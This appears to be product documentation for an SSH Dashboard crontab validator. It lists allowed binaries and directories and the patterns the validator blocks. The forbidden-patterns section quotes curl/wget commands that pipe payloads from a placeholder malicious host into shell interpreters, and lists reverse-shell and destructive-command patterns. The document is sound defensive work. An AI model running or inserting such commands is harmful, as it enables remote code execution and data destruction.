# Crontab Command Validation Rules

SSH Dashboard employs a strict validation engine (`CommandValidator.validateCronJob`) before saving, editing, or executing crontab jobs. The engine enforces a **Strict Whitelist** strategy (`default block`), ensuring only pre-approved system utilities, language runtimes, and script paths can be executed while actively blocking dangerous or exploitable patterns.

---

## 1. Whitelisted Utilities & Binaries (`_whitelistedCronBinaries`)

When specifying a command without an absolute path, each command segment (separated by `&&`, `||`, or `;`) is checked after stripping leading `sudo` or `env` modifiers. The first word (`firstWord`) must exactly match one of the authorized utilities:

### Archival & Backup
* `rsync`, `tar`, `gzip`, `gunzip`, `bzip2`, `xz`, `zip`, `unzip`
* `borg`, `restic`, `rclone`

### Database Dump & Clients
* `pg_dump`, `pg_dumpall`, `mysqldump`, `sqlite3`
* `mysql`, `psql`, `mongodump`, `redis-cli`

### Package Managers
* `apt`, `apt-get`, `dpkg`, `dnf`, `yum`, `pacman`, `zypper`, `apk`, `snap`, `flatpak`

### System Maintenance & Containers
* `systemctl`, `service`, `journalctl`, `logrotate`, `find`, `fstrim`, `updatedb`, `ldconfig`
* `certbot`, `docker`, `podman`

### Storage & Filesystem
* `zpool`, `zfs`, `btrfs`, `mdadm`, `smartctl`

### Languages, Runtimes & Process Managers
* `php`, `python`, `python3`, `node`, `npm`, `pm2`, `java`, `ruby`

### Networking & Webhooks
* `curl`, `wget`

### Version Control
* `git`

### Base Shell Utilities
* `echo`, `true`, `date`

---

## 2. Whitelisted Script Directories (`_whitelistedScriptDirectories`)

If a command or script is executed using an **absolute path** (e.g., `/home/user/backup.sh`), the path prefix must match one of the following secure system/user directories:

* `/home/`
* `/root/`
* `/opt/`
* `/usr/local/bin/` and `/usr/local/sbin/`
* `/usr/bin/` and `/usr/sbin/`
* `/bin/` and `/sbin/`
* `/srv/`
* `/var/www/`
* `/var/backups/`

> **Note**: Any absolute path outside these directories is automatically blocked unless specifically authorized.

---

## 3. Strict Security Rules & Forbidden Patterns (`_forbiddenPatterns`)

Even if a command uses whitelisted binaries or secure directory paths, the entire job will be **blocked immediately** if it triggers any of the following security restrictions:

### 1. Subshells & Command Substitution
* **Forbidden**: Backticks (\`) and dollar-parentheses `$(...)` subshells are blocked across all crontab entries to prevent command substitution attacks.

### 2. World-Writable Execution Paths
* **Forbidden**: Executing scripts inside world-writable or temporary directories (`/tmp/`, `/var/tmp/`, `/dev/shm/`) is blocked across both user and root cron jobs.
* This restriction applies whether the script is executed directly (`/tmp/evil.sh`) or passed to an interpreter (`python3 /tmp/evil.py`, `node /tmp/worker.js`, `bash /tmp/run.sh`, etc.).

### 3. Remote Download & Piping to Interpreters
* **Forbidden**: Downloading remote payloads via `curl` or `wget` and piping (`|`) them directly into shell interpreters or language runtimes is strictly blocked:
  ```bash
  curl http://malicious.com/payload.sh | bash
  wget -qO- http://malicious.com/payload.py | sudo python3
  ```
  *(Blocked interpreters include: `bash`, `sh`, `zsh`, `python`, `python3`, `node`, `perl`, `ruby`, and `php`).*

### 4. Dangerous & Destructive Command Patterns
* **Filesystem Deletion**: `rm -rf`, `rm -r `, `rm -f /`
* **Reverse Shells & Networking**: `mkfifo`, `/dev/tcp/`, `/dev/udp/`, `nc -e`, `nc -c`, `ncat -e`, `netcat -e`, `bash -i`, `sh -i`
* **Inline Code & Interactive Evaluation**:
  * `python -c`, `python3 -c`, `python -i`, `python3 -i`
  * `perl -e`
  * `ruby -e`, `ruby -i`
  * `php -r`, `php -a`
  * `node -e`, `node --eval`, `node -i`, `node --interactive`
  * `eval `
* **Massive Permission Modification**: `chmod 777`, `chown -R`
* **Raw Disk I/O**: `dd if=`
* **System Directory Overwrites**: Redirection (`>` or `>>`) targeting `/etc/`, `/boot/`, `/bin/`, `/sbin/`, `/usr/`, `/lib/`, `/proc/`, or `/sys/`.

---

## 4. Root `@reboot` Job Policy

Root cron jobs scheduled to run automatically on system boot (`@reboot`) undergo additional verification due to high boot persistence risks:

1. **Strict Network & Pipe Blocking**: If a root `@reboot` job contains network requests (`curl`, `wget`) or any pipes (`|`), it is **blocked permanently**.
2. **Persistence Warning**: If a root `@reboot` job passes all validation rules (e.g., executing a local script like `/root/startup.sh`), it is permitted but triggers an explicit warning alerting the administrator that the job executes with root privileges on every system boot.
